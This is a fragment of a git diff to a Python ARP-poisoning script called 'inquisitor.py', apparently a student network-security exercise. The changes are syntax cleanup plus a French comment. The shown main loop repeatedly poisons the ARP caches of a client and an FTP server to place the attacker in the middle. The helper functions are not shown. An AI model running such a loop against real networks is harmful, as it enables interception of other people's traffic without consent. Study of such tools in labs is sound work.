@@ -13,18 +13,19 @@ def restore_arp(target_ip, target_mac, source_ip, source_mac):
 
 
 if __name__ == "__main__":
-    if (len(sys.argv) < 5):
+    if len(sys.argv) < 5:
         print("Usage: python3 inquisitor.py <IPsource> <MACsource> <IPtarget> <MACtarget>")
         sys.exit(1)
 
-    IPsource = sys.argv[1];
-    MACsource = sys.argv[2];
-    IPtarget = sys.argv[3];
-    MACtarget = sys.argv[4];
+    IPsource = sys.argv[1]
+    MACsource = sys.argv[2]
+    IPtarget = sys.argv[3]
+    MACtarget = sys.argv[4]
 
     try:
         print("Inquisitor is poisoning the network...")
         while True:
+            # Envoie de paquets ARP pour empoisonner les deux machines (client et serveur FTP)
             arp_poison(IPtarget, MACtarget, IPsource, MACsource)
             arp_poison(IPsource, MACsource, IPtarget, MACtarget)
             time.sleep(1)
